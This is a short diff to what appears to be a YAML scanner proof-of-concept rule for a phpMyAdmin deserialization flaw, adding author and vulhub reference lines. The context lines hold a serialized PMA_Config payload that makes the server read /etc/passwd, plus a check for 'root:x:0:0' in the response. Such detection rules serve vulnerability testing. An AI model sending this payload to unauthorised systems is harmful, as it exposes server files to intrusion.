@@ -6,3 +6,6 @@ rules:
       action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
     follow_redirects: false
     expression: 'status==200 && body.bcontains(b''root:x:0:0'')'
+detail:
+  author: p0wd3r
+  vulhub: https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
